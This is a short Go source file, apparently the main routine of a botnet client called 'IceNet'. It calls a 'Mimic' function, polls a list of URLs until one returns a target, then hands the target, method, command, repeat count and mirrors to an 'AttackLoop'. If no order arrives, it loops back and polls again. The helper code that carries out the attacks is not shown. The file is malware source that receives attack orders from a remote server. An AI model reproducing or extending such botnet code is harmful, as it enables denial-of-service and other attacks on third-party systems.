package main

import (
	util "IceNet/utils"
	"fmt"
)

func main() {

	util.Mimic()

response:
	var resp util.Response
	fmt.Println(resp)
	urls := util.ParseUrls()

	for i := 0; i < len(urls.Links); i++ {
		var err string = util.GetGoodRequest(true, urls.Links[i])
		if err != "bad" {
			resp = util.ParseTarget(err)
			break

		}

	}

	if resp.Typemethod != "" {
		util.AttackLoop(false, resp.Target, resp.Times, resp.Typemethod, string(resp.Cmd), resp.Mirrors)
	} else {
		goto response
	}

}
